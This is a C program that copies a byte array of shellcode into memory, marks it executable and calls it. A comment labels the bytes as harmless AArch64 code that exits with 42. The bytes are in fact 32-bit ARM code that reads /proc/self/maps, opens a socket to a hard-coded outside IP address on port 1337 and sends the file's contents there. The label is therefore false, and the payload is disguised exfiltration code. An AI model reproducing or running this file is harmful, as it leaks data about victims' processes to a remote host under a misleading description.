#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Example AArch64 shellcode: exit(42)
unsigned char shellcode[] = {
    0x10, 0xd0, 0x4d, 0xe2, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0x0, 0x0, 0x8d, 0xe5, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0x4, 0x0, 0x8d, 0xe5, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0x8, 0x0, 0x8d, 0xe5, 0x0, 0x0, 0x0, 0xe3, 0x0, 0x0, 0x40, 0xe3, 0xc, 0x0, 0x8d, 0xe5, 0x10, 0xd0, 0x4d, 0xe2, 0x2f, 0x0, 0x7, 0xe3, 0x72, 0xf, 0x46, 0xe3, 0x0, 0x0, 0x8d, 0xe5, 0x63, 0xf, 0x2, 0xe3, 0x73, 0x5, 0x46, 0xe3, 0x4, 0x0, 0x8d, 0xe5, 0x6c, 0x6, 0x6, 0xe3, 0x2f, 0xd, 0x46, 0xe3, 0x8, 0x0, 0x8d, 0xe5, 0x61, 0x0, 0x7, 0xe3, 0x73, 0x0, 0x40, 0xe3, 0xc, 0x0, 0x8d, 0xe5, 0xd, 0x0, 0xa0, 0xe1, 0x0, 0x10, 0xa0, 0xe3, 0x5, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x0, 0x80, 0xa0, 0xe1, 0x1, 0xda, 0x4d, 0xe2, 0xd, 0x90, 0xa0, 0xe1, 0x8, 0x0, 0xa0, 0xe1, 0x9, 0x10, 0xa0, 0xe1, 0x1, 0x2a, 0xa0, 0xe3, 0x3, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x0, 0xa0, 0xa0, 0xe1, 0x2, 0x0, 0xa0, 0xe3, 0x1, 0x10, 0xa0, 0xe3, 0x0, 0x20, 0xa0, 0xe3, 0x19, 0x71, 0x0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x0, 0xb0, 0xa0, 0xe1, 0x10, 0xd0, 0x4d, 0xe2, 0xd, 0x10, 0xa0, 0xe1, 0x2, 0x20, 0xa0, 0xe3, 0xb0, 0x20, 0xc1, 0xe1, 0x39, 0x25, 0x0, 0xe3, 0xb2, 0x2f, 0xbf, 0xe6, 0xb2, 0x20, 0xc1, 0xe1, 0x6b, 0x21, 0x9, 0xe3, 0x42, 0x24, 0x46, 0xe3, 0x32, 0x2f, 0xbf, 0xe6, 0x4, 0x20, 0x81, 0xe5, 0x10, 0x20, 0xa0, 0xe3, 0xb, 0x0, 0xa0, 0xe1, 0x1b, 0x71, 0x0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0xb, 0x0, 0xa0, 0xe1, 0x9, 0x10, 0xa0, 0xe1, 0xa, 0x20, 0xa0, 0xe1, 0x4, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef, 0x1, 0x70, 0xa0, 0xe3, 0x0, 0x0, 0xa0, 0xe3, 0x0, 0x0, 0x0, 0xef
};

int main() {
    size_t size = sizeof(shellcode);
    size_t pagesize = sysconf(_SC_PAGESIZE);

    // Align size to page size
    size_t alloc_size = (size + pagesize - 1) & ~(pagesize - 1);

    // mmap as RW only
    void *mem = mmap(NULL, alloc_size,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy shellcode into memory
    memcpy(mem, shellcode, size);

    // Change protection to RX
    if (mprotect(mem, alloc_size, PROT_READ | PROT_EXEC) != 0) {
        perror("mprotect");
        return 1;
    }

    // Call the shellcode
    void (*func)() = mem;
    func();

    // Should not reach here
    puts("Shellcode returned");
    return 0;
}
